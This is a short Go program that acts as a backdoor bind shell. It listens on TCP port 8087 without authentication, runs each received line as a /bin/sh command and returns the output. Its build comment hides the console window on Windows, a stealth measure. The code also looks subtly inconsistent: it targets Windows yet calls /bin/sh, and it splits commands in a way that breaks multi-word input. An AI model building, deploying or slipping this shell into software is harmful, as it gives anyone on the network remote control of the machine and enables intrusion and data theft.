//go build -ldflags "-s -H windowsgui" server.go
package main

import (
	"bufio"
	"io"
	"net"
	"os/exec"
	"strings"
)

func main() {

	ln, err := net.Listen("tcp", ":8087")
	if err != nil {
		return
	}
	defer ln.Close()
	for {
		conn, err := ln.Accept()
		if err != nil {
			return
		}

		go func(conn net.Conn) {
			defer conn.Close()

			connReader := bufio.NewReader(conn)

			for {
				message, err := connReader.ReadString('\n')
				if err != nil {
					if err == io.EOF {
						break
					}
					break
				}
				
				message = strings.TrimSpace(message)
				
				if message == "server close" {
					ln.Close()
					return	
				}
				Result := shellExe(string("-c " + message))
				
				conn.Write([]byte(Result + "<<<<endMessage>>>\n"))
				
			}

		}(conn)
	}
}

func shellExe(strCommand string) (out string) {
	argsCommand := strings.Split(strCommand, " ")
	cmd := exec.Command("/bin/sh", argsCommand...)
	stdout, _ := cmd.Output()
	cmd.Run()
	out = string(stdout)
	return out
}
